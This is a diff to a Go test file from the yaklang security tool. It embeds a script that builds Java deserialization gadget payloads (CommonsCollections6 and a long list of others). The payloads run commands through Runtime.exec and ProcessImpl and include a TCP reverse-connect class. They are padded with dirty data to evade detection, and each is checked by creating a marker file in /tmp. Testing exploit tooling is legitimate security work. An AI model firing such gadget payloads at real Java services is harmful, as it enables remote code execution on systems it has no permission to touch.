@@ -1,9 +1,10 @@
 package yaktest
 
 import (
+	"testing"
+
 	"github.com/yaklang/yaklang/common/utils"
 	"github.com/yaklang/yaklang/common/yak"
-	"testing"
 )
 
 var ysoTestCode = `
@@ -44,7 +45,35 @@ for gadgetName in transformChianGadgets{
 		failedGadgets.Append(gadgetName)
 	}
 }
-
+println("="*50)
+for gadgetName in ["CommonsCollections6"]{
+	try {
+		extArg = ""
+		if extArgsMap[gadgetName] != nil{
+			extArg = "=/tmp/classes,"+extArgsMap[gadgetName]
+		}
+		randomstr = str.RandStr(8)
+		path = "/tmp/%s" % randomstr
+        content = yso.GenerateClass(yso.useRuntimeExecTemplate(),yso.command("touch "+path))~
+        payload = yso.ToBytes(content)~
+		gadgetIns = yso.GetGadget(gadgetName,"mozilla_defining_class_loader",codec.EncodeBase64(payload))~
+		payload1 = yso.ToBytes(gadgetIns)~
+		payload = yso.ToBytes(gadgetIns,yso.threeBytesCharString(),yso.dirtyDataLength(10000))~
+		assert len(payload) - len(payload1) > 10000
+		payloadBase64 = codec.EncodeBase64(payload)~
+		cmd = "/Library/Java/JavaVirtualMachines/zulu-8.jdk/Contents/Home/bin/java '-javaagent:/tmp/yak-yso-tester-loader.jar%s' -jar /tmp/yak-yso-tester.jar '%s'"%[extArg,payloadBase64]
+		exec.System(cmd)
+		if !file.IsExisted(path){
+			panic("not found file")
+		}
+		file.Remove(path)
+		log.info("gadget %s load_class test success",gadgetName)
+	} catch e {
+		log.error("gadget %s exec test failed: %v", gadgetName,e)
+		failedGadgets.Append(gadgetName)
+	}
+}
+println("="*50)
 templateGadgetNames = ["CommonsCollectionsK1","CommonsCollectionsK2","Jdk7u21","CommonsCollections8","MozillaRhino2","JSON1","CommonsBeanutils1","Click1","Spring2","CommonsCollections10","CommonsBeanutils2","CommonsBeanutils1_183","JavassistWeld1","CommonsCollections11","Spring1","CommonsCollections3","Jdk8u20","CommonsCollections2","JBossInterceptors1","MozillaRhino1","ROME","CommonsBeanutils2_183","CommonsCollections4","Hibernate1","Vaadin1"]
 //templateGadgetNames = ["CommonsCollections8"]
 for gadgetName in templateGadgetNames{
@@ -135,7 +164,7 @@ pushTestCase("ProcessBuilderExec",()=>{
 	return false
 })
 pushTestCase("ProcessImplExec",()=>{
-	randomstr = str.RandStr(8)
+	randomstr = "ProcessImplExec_"+str.RandStr(8)
 	path = "/tmp/%s" % randomstr
 	execPayload(yso.useProcessImplExecEvilClass("touch "+path))
 	if file.IsExisted(path){
@@ -155,7 +184,7 @@ pushTestCase("TcpReverse",()=>{
 		recvToken = str.TrimSpace(string(byt))
 	}))
 	execPayload(yso.useTcpReverseEvilClass(host,port),yso.tcpReverseToken(token))
-	sleep(0.5)
+	sleep(1)
 	recvToken = recvToken[2:]
 	return recvToken == token
 })
